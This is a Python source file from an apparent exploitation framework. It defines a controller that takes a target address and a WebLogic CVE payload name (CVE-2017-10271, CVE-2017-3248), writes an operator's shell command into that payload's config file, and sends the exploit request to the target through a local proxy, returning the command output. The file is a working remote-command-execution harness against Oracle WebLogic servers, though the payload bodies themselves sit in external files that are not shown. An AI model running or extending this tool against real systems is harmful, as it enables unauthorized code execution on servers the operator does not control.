#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/11/17 12:19 上午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : rocCommondController.py
# @Software: PyCharm

import configparser
import re
import time
import requests
import os
import ast
import importlib


requests.packages.urllib3.disable_warnings()


class rocCommandController(object):
    def __init__(self):
        self.name = "CVE_2017_10271_weblogic"

    def runCommand(self, targetAddr, payload, command):
        """
        加载外部程序
        POC检测控制器
        :param targetAddr:
        :param payload:
        :return:
        """
        if payload == "CVE_2017_3248_weblogic":
            pass
            module = 'rocCommandPayload.{}'.format(payload)
            importModule = importlib.import_module(module)
            data = importModule.run.runCommand(self, targetAddr, payload, command)
            return data
        else:
            getCurPath = os.getcwd()
            configPath = '{}/rocCommandPayload/{}.ini'.format(getCurPath, payload)
            config = configparser.RawConfigParser()
            config.read(configPath)
            node = "rules-req01"
            key = "cmd"
            value = command
            config.set(node, key, value)
            fh = open(configPath, 'w',encoding='utf-8')
            config.write(fh)
            fh.close()
            options = config.sections()

            speciConfig = configparser.ConfigParser()
            speciConfig.read(configPath)
            specioptions = speciConfig.sections()
            currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

            for option, specioption in zip(options, specioptions):
                if (re.match('rules', option)) is not None:
                    method = config.get(option, 'method')
                    cmd = config.get(option, 'cmd')
                    if method == "POST":
                        header = speciConfig.get(specioption, 'header')
                        path = config.get(option, 'path')
                        body = speciConfig.get(option, 'body')
                        expression = config.get(option, 'expression')
                        url = targetAddr + path
                        print(url)

                        try:
                            header_dict = ast.literal_eval(header)
                            proxies = {
                                'http': '127.0.0.1:8089',
                                'https': '127.0.0.1:8089'
                            }
                            res = requests.post(url, data=body, verify=False, timeout=5, headers=header_dict,
                                                proxies=proxies)
                            # driver.quit()
                            print(body)
                            # res = requests.post(url, data=body, verify=False, timeout=5, headers=header_dict)
                            print(res.text)
                            command_data = res.text

                            if expression not in res.text:
                                try:
                                    return {'status': 20000, 'data': command_data, 'type': 'content'}
                                except Exception as e:
                                    pass
                                command_data = '[+] Command Successfull {}'.format(currentTime)
                                return {'status': 20000, 'data': command_data, 'type': 'status'}
                            else:
                                command_data = '[-] Command Failed {}'.format(currentTime)
                                return {'status': 20001, 'data': command_data, 'type': 'status'}
                        except requests.exceptions.RequestException as e:
                            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
                            return {'status': 20002, 'data': status_data, 'type': 'status'}
                    elif method == "GET":
                        header = speciConfig.get(specioption, 'header')
                        path = speciConfig.get(option, 'path')
                        expression = config.get(option, 'expression')
                        url = targetAddr + path
                        print(url)

                        try:
                            header_dict = ast.literal_eval(header)

                            proxies = {
                                'http': '127.0.0.1:8089',
                                'https': '127.0.0.1:8089'
                            }
                            res = requests.get(url, verify=False, timeout=5, headers=header_dict,
                                                proxies=proxies)

                            command_data = res.text
                            print(command_data)

                            if expression not in res.text:
                                try:
                                    return {'status': 20000, 'data': command_data, 'type': 'content'}
                                except Exception as e:
                                    pass
                                command_data = '[+] Command Successfull {}'.format(currentTime)
                                return {'status': 20000, 'data': command_data, 'type': 'status'}
                            else:
                                command_data = '[-] Command Failed {}'.format(currentTime)
                                return {'status': 20001, 'data': command_data, 'type': 'status'}
                        except requests.exceptions.RequestException as e:
                            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
                            return {'status': 20002, 'data': status_data, 'type': 'status'}
                    else:
                        pass
